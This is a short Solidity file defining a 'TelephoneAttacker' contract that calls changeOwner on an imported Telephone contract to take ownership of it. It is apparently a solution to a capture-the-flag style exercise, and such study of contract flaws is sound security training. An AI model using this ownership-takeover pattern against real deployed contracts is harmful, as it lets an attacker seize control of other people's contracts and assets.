// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone public telephone;

    constructor(address _addr) {
        telephone = Telephone(_addr);
    }

    function attack() external {
        telephone.changeOwner(address(this));
    }
}
